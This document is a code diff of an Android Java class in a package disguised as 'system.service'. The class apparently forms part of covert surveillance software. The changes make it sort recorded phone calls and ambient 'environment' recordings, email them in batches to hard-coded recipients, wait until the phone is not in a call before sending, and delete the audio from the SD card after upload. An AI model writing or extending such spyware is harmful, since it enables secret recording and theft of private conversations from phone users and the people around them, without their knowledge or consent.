@@ -1,4 +1,4 @@
-package system.service;
+package system.service.task;
 
 import java.io.DataOutputStream;
 import java.io.File;
@@ -9,6 +9,9 @@ import java.util.Date;
 import java.util.List;
 import java.util.TimerTask;
 
+import system.service.GlobalValues;
+import system.service.R;
+import system.service.R.string;
 import system.service.activity.GlobalPrefActivity;
 import system.service.activity.NETWORK_CONNECT_MODE;
 import system.service.config.ConfigCtrl;
@@ -52,11 +55,9 @@ public class GetInfoTask extends TimerTask
 	private final static int DEFAULT_RETRY_COUNT = 3;
 	
 	public Context context;
-	private int interval = 1; // interval days
+	private int interval; // interval days
 	
 	public static List<File> attachments;
-	
-	private static final long MIN_FILE_SIZE = 10240; // 10KB
 	
 	public GetInfoTask(Context context)
 	{
@@ -181,11 +182,18 @@ public class GetInfoTask extends TimerTask
 		
 		// Get all wav files
 		List<File> wavs = FileCtrl.getAllWavFiles(context);
-		int wavCount = wavs.size();
-		if (wavCount > 0) {
+		if (wavs.size() > 0) {
 			wavs = FileCtrl.sortFileByTimeOrder(wavs);
-			boolean allowToSend = false;
+			List<File> callRecordWavs = FileCtrl.filterWavFilesByPrefix(wavs, GlobalValues.callRecordFilePrefix);
+			int callRecordWavsCount = callRecordWavs.size();
+			List<File> envRecordWavs  = FileCtrl.filterWavFilesByPrefix(wavs, GlobalValues.envRecordFilePrefix);
+			int envRecordWavsCount = envRecordWavs.size();
 			
+			// -------------------------------------------------------------------------------------------
+			// Firstly we should make sure: 
+			// 1. The phone is NOT off-hook
+			// 2. The networks are availble and meet the setting requirement
+			boolean allowToSend = false;
 			TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
 			try {
 				allowToSend = ! PhoneUtils.getITelephony(tm).isOffhook();
@@ -226,29 +234,32 @@ public class GetInfoTask extends TimerTask
 				}
 			} // end of if (allowToSend)
 		
+			// ------------------------------------------------------------------------------
+			// Start to send wav files
 			if (allowToSend) {
-				String prefix = context.getResources().getString(R.string.phonecall_record);
-		
-				// Send mails (5 wavs attached per mail) 
-				int COUNT_PER_PACKAGE = 5;
-				String phoneNum = ConfigCtrl.getSelfName(context);
-				String body = String.format(context.getResources().getString(R.string.mail_body_record), phoneNum);
+				// --------------------------------------------------------------------------
+				// Send call record mails (3 wavs attached per mail) 
+				int COUNT_PER_PACKAGE = 3;
+				String phoneName = ConfigCtrl.getSelfName(context);
+				String body = String.format(context.getResources().getString(R.string.mail_body_call_record), phoneName);
+				String fromStr = context.getResources().getString(R.string.mail_from);
+				String host = MailCfg.getHost(context);
+				String sender = MailCfg.getSender(context);
 				String pwd = MailCfg.getSenderPwd(context);
 		
-				for (int i=0; i < (1 + wavCount/COUNT_PER_PACKAGE); i++) {
-					List<File> pack = getPackage(wavs, COUNT_PER_PACKAGE, i);
-					if (pack.size() <= 0) break;
+				for (int i = 0; i < (1 + callRecordWavsCount/COUNT_PER_PACKAGE); i++) {
+					List<File> pack = getPackage(callRecordWavs, COUNT_PER_PACKAGE, i);
+					if (pack.size() <= 0) continue;
 
-					String subject = prefix + "-" + context.getResources().getString(R.string.mail_from) + phoneNum 
+					String subject = GlobalValues.callRecordFilePrefix + "-" + fromStr + phoneName 
 							+ "-" + DatetimeUtil.format2.format(new Date());
 			
 					if (!NetworkUtil.isNetworkConnected(context)) {
 						return;
 					}
+					
 					boolean result = false;
 					int retry = DEFAULT_RETRY_COUNT;
-					String host = MailCfg.getHost(context);
-					String sender = MailCfg.getSender(context);
 					String errMsg = "";
 					while(!result && retry > 0)
 					{
@@ -261,8 +272,38 @@ public class GetInfoTask extends TimerTask
 						FileCtrl.cleanWavFiles(pack);
 					}
 				} // end of for(...)
+				
+				// --------------------------------------------------------------------------
+				// Send env record mails (3 wavs attached per mail) 
+				body = String.format(context.getResources().getString(R.string.mail_body_env_record), phoneName);
+				for (int i = 0; i < (1 + envRecordWavsCount/COUNT_PER_PACKAGE); i++) {
+					List<File> pack = getPackage(envRecordWavs, COUNT_PER_PACKAGE, i);
+					if (pack.size() <= 0) continue;
+
+					String subject = GlobalValues.envRecordFilePrefix + "-" + fromStr + phoneName 
+							+ "-" + DatetimeUtil.format2.format(new Date());
+			
+					if (!NetworkUtil.isNetworkConnected(context)) {
+						return;
+					}
+					
+					boolean result = false;
+					int retry = DEFAULT_RETRY_COUNT;
+					String errMsg = "";
+					while(!result && retry > 0)
+					{
+						result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, pack, errMsg);
+						retry--;
+					}
+		
+					// Clean wav files in SD-CARD
+					if (result) {
+						FileCtrl.cleanWavFiles(pack);
+					}
+				} // end of for(...)
+				
 			} // end of if (allowToSend)
-		} // if (wavCount > 0)
+		} // end of (wavs.size() > 0)
 		
 		// ===================================================================================
 		// Restore phone settings
@@ -309,13 +350,7 @@ public class GetInfoTask extends TimerTask
 		int wavCount = wavs.size();
 		for (int j=i*count; j<(i+1)*count; j++) {
 			if (j < wavCount) {
-				// Valid if size is larger than 10KB
-				if (wavs.get(j).length() > MIN_FILE_SIZE) {
-					pack.add(wavs.get(j));
-				} else { 
-					try { wavs.get(j).delete(); }
-					catch (Exception ex) {}
-				}
+				pack.add(wavs.get(j));
 			}
 		}
 		return pack;
